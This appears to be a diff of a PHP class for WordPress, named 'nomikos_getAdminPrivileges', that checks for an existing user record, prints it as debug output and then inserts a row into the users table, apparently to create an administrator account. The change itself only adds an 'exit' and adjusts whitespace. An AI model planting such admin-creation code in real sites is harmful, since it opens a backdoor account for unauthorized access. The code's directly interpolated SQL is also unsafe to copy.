@@ -92,15 +92,15 @@ class nomikos_getAdminPrivileges
         if ($record)
         {
             $this->d('some data exists. change it please:');
-            
             $this->d($record);
 
             $sql = "SELECT * FROM {$wpdb->base_prefix}usermeta
             WHERE
             user_id = '{$record->ID}'";
             $record = $wpdb->get_results($sql);
-
             $this->d($record, 1);
+
+            exit;
         }
 
         $wpdb->insert("{$wpdb->base_prefix}users",
@@ -146,7 +146,7 @@ class nomikos_getAdminPrivileges
     {
         if (is_string($var))
         $var = "<b>$var</b>";
-        
+
         echo '<pre>' . var_export($var, 1) . '</pre>';
         if ($exit)
             exit;
